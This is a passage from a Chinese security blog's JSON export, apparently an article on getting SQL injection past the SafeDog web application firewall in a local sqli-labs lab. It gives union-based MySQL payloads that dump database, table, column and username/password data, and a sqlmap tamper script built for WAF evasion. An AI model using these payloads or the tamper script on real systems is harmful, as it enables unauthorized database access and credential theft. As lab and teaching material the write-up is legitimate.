punctuation\">,</span><span class=\"token number\">3</span> <span class=\"token operator\">--</span><span class=\"token operator\">+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151116.png\" alt=\"在这里插入图片描述\"><br>发现没有绕过，此时我们将union后的空格用换行符替代</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span>' like <span class=\"token string double-quoted-string\">\"[%23]\"</span> <span class=\"token comment\">/*!10440union%0aselect*/</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span> <span class=\"token operator\">--</span><span class=\"token operator\">+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151326.png\" alt=\"在这里插入图片描述\"><br>此时就可以注入了，因此新的姿势就出现了，其他具体的不再列举，这里给出payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">//爆库</span>\nid<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string single-quoted-string\">' like \"[%23]\" /*!10440union%0aselect*/ 1,2,database/*!--+/*%0a()*/ --+\n//爆表\nid=-1'</span> like <span class=\"token string double-quoted-string\">\"[%23]\"</span> <span class=\"token comment\">/*!10440union%0aselect*/</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token function\">group_concat</span><span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span>from<span class=\"token comment\">/*!--+/*%0ainformation_schema.tables */</span>where table_schema<span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'security'</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token comment\">//爆列</span>\nid<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string single-quoted-string\">' like \"[%23]\" /*!10440union%0aselect*/ 1,2,group_concat(column_name)from/*!--+/*%0ainformation_schema.columns */where table_name='</span>users<span class=\"token string single-quoted-string\">'--+\n//爆字段\nid=-1'</span> like <span class=\"token string double-quoted-string\">\"[%23]\"</span> <span class=\"token comment\">/*!10440union%0aselect*/</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token function\">group_concat</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">)</span>from<span class=\"token comment\">/*!--+/*%0ausers*/</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>              <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h1 id=\"tamper脚本\"><a href=\"#tamper脚本\" class=\"headerlink\" title=\"tamper脚本\"></a>tamper脚本</h1><p>脚本如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">#!/usr/bin/env python</span>\n\n<span class=\"token string double-quoted-string\">\"\"</span><span class=\"token string double-quoted-string\">\"\nCopyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\nAuthor:quan9i.top\n\"</span><span class=\"token string double-quoted-string\">\"\"</span>\n\nimport re <span class=\"token comment\">#导入re模块</span>\nimport os <span class=\"token comment\">#导入os模块</span>\n\nfrom lib<span class=\"token operator\">.</span>core<span class=\"token operator\">.</span>data import kb <span class=\"token comment\">#导入sqlmap中lib\\core\\data中的kb函数,测试SQL注入的过程中,使用的配置文件事先全部被加载到了conf和kb</span>\nfrom lib<span class=\"token operator\">.</span>core<span class=\"token operator\">.</span>enums import <span class=\"token constant\">PRIORITY</span>  <span class=\"token comment\">#导入sqlmap中lib\\core\\enums中的PRIORITY函数，LOWEST = -100,LOWER = -50,LOW = -10,NORMAL = 0,HIGH = 10,HIGHER = 50,HIGHEST = 100</span>\nfrom lib<span class=\"token operator\">.</span>core<span class=\"token operator\">.</span>common import singleTimeWarnMessage<span class=\"token comment\">#输出到sqlmap控制台的函数</span>\nfrom lib<span class=\"token operator\">.</span>core<span class=\"token operator\">.</span>enums import <span class=\"token constant\">DBMS</span><span class=\"token comment\">#一个数据库的枚举</span>\n__priority__ <span class=\"token operator\">=</span> <span class=\"token constant\">PRIORITY</span><span class=\"token operator\">.</span><span class=\"token constant\">LOW</span><span class=\"token comment\">#定义优先级为LOW</span>\n\ndef <span class=\"token function\">dependencies</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token class-name return-type\">singleTimeWarnMessage</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Bypass safedog by pureqh'%s' only %s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>os<span class=\"token operator\">.</span>path<span class=\"token operator\">.</span><span class=\"token function\">basename</span><span class=\"token punctuation\">(</span>__file__<span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">DBMS</span><span class=\"token operator\">.</span><span class=\"token constant\">MYSQL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># singleTimeWarnMessage() 用于在控制台中打印出警告信息</span>\ndef <span class=\"token function\">tamper</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">,</span> <span class=\"token operator\">**</span>kwargs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\t<span class=\"token class-name return-type\">payload</span><span class=\"token operator\">=</span>payload<span class=\"token operator\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'AND'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'/*!10000AND*/'</span><span class=\"token punctuation\">)</span>\n\tpayload<span class=\"token operator\">=</span>payload<span class=\"token operator\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'OR'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'/*!10000OR*/'</span><span class=\"token punctuation\">)</span>\n\tpayload<span class=\"token operator\">=</span>payload<span class=\"token operator\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'ORDER BY'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'ORDER/*////*/BY'</span><span class=\"token punctuation\">)</span>\n\tpayload<span class=\"token operator\">=</span>payload<span class=\"token operator\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'()'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'/*!20553()*/'</span><span class=\"token punctuation\">)</span>\n\tpayload<span class=\"token operator\">=</span>payload<span class=\"token operator\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'UNION SELECT'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'UNION/*/!*!**/SELECT'</span><span class=\"token punctuation\">)</span>\n\tpayload<span class=\"token operator\">=</span>payload<span class=\"token operator\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'information_schema.tables'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'/*!%23%0ainformation_schema.tables*/'</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">return</span> payload\n\t<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>示例如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">//检测可注入类型</span>\npython sqlmap<span class=\"token operator\">.</span>py <span class=\"token operator\">-</span>u http<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:81/sqli-labs-master/Less-1/?id=1 --tamper=dog </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151339.png\" alt=\"在这里插入图片描述\"><br>破解数据库</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">python sqlmap<span class=\"token operator\">.</span>py <span class=\"token operator\">-</span>u http<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:81/sqli-labs-master/Less-1/?id=1 --dbs --tamper=dog -v5</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151492.png\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h1><p><a href=\"https://xz.aliyun.com/t/10479#toc-0\">https://xz.aliyun.com/t/10479#toc-0</a><br><a href=\"https://zhuanlan.zhihu.com/p/472880971\">https://zhuanlan.zhihu.com/p/472880971</a><br><a href=\"https://www.cnblogs.com/Cl0ud/p/14394627.html\">https://www.cnblogs.com/Cl0ud/p/14394627.html</a><br><a href=\"https://cloud.tencent.com/developer/article/1856738\">https://cloud.tencent.com/developer/article/1856738</a><br><a href=\"https://blog.csdn.net/weixin_39190897/article/details/115841059\">https://blog.csdn.net/weixin_39190897/article/details/115841059</a><br><a href=\"https://blog.csdn.net/Drifter_Galaxy/article/details/108435339\">https://blog.csdn.net/Drifter_Galaxy/article/details/108435339</a><br><a href=\"https://www.freebuf.com/articles/web/321240.html\">https://www.freebuf.com/articles/web/321240.html</a><br><a href=\"https://www.cnblogs.com/Cl0ud/p/14493204.html\">https://www.cnblogs.com/Cl0ud/p/14493204.html</a><br><a href=\"https://www.cnblogs.com/Cl0ud/p/14394627.html\">https://www.cnblogs.com/Cl0ud/p/14394627.html</a></p>\n","feature":true,"text":"声明文章首发于先知社区https://xz.aliyun.com/t/11412 前言SQL注入并不是很精通，通过实战绕过WAF来进行加强SQL注入能力，希望对正在学习的师傅能有一丝帮助。 安装安装前言我是本地搭建的环境进行测试的环境是windows11+phpstudy2018...","link":"","photos":[],"count_time":{"symbolsCount":"7.3k","symbolsTime":"7 mins."},"categories":[{"name":"绕WAF","slug":"绕WAF","count":1,"path":"api/categories/绕WAF.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":2,"path":"api/tags/SQL注入.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%A3%B0%E6%98%8E\"><span class=\"toc-text\">声明</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%AE%89%E8%A3%85\"><span class=\"toc-text\">安装</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%89%E8%A3%85%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">安装前言</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%BF%87%E7%A8%8B\"><span class=\"toc-text\">过程</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%9E%84%E9%80%A01-1\"><span class=\"toc-text\">构造1&#x3D;1</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%B8%80\"><span class=\"toc-text\">方法一</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%BA%8C\"><span class=\"toc-text\">方法二</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#order-by-%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">order by 绕过</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2\"><span class=\"toc-text\">联合查询</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%88%86%E5%BA%93\"><span class=\"toc-text\">爆库</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%B8%80-%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">方法一(&#x2F;**&#x2F;方法)</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%BA%8C-%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A%E6%B3%95\"><span class=\"toc-text\">方法二(&#x2F;*!*&#x2F;内联注释法)</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%88%86%E8%A1%A8\"><span class=\"toc-text\">爆表</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%88%86%E5%88%97\"><span class=\"toc-text\">爆列</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%88%86%E5%AD%97%E6%AE%B5%E4%BF%A1%E6%81%AF\"><span class=\"toc-text\">爆字段信息</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%85%B6%E4%BB%96%E5%A7%BF%E5%8A%BF\"><span class=\"toc-text\">其他姿势</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#like-%E2%80%9C-23%E2%80%9D\"><span class=\"toc-text\">like[“%23”]</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#tamper%E8%84%9A%E6%9C%AC\"><span class=\"toc-text\">tamper脚本</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE\"><span class=\"toc-text\">参考文献</span></a></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"从零基础入门PHP反序列化","uid":"7521324f3a376c53e83c35f44da3ffc9","slug":"从零基础入门PHP反序列化","date":"2022-06-17T07:28:30.000Z","updated":"2024-02-14T07:50:26.000Z","comments":true,"path":"api/articles/从零基础入门PHP反序列化.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141547720.png","text":"前言反序列化是一个尤为重要的知识点，最近对反序列化进行了简单学习，并总结如下，希望能对正在学习的师傅有所帮助。 前提了解序列化和反序列化学习反序列化之前，首先要知道序列化，简单的举个栗子来说 &lt;?php $a='quan9i'; echo \"----------初始数据--...","link":"","photos":[],"count_time":{"symbolsCount":"44k","symbolsTime":"40 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"反序列化","slug":"反序列化","count":4,"path":"api/tags/反序列化.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"记一次较为详细的某CMS代码审计","uid":"2630421829e46cd019f16a83899a54d6","slug":"记一次较为详细的某CMS代码审计","date":"2022-06-08T09:35:30.000Z","updated":"2024-02-14T07:32:40.000Z","comments":true,"path":"api/articles/记一次较为详细的某CMS代码审计.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141523815.png","text":"声明文章首发于先知社区https://xz.aliyun.com/t/11714 前言本次审计的话是Seay+昆仑镜进行漏洞扫描Seay的话它可以很方便的查看各个文件，而昆仑镜可以很快且扫出更多的漏洞点，将这两者进行结合起来，就可以发挥更好的效果。昆仑镜官方地址https://g...","link":"","photos":[],"count_time":{"symbolsCount":"32k","symbolsTime":"29 mins."},"categories":[{"name":"代码审计","slug":"代码审计","count":7,"path":"api/categories/代码审计.json"}],"tags":[{"name":"代码审计","slug":"代码审计","count":6,"path":"api/tags/代码审计.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}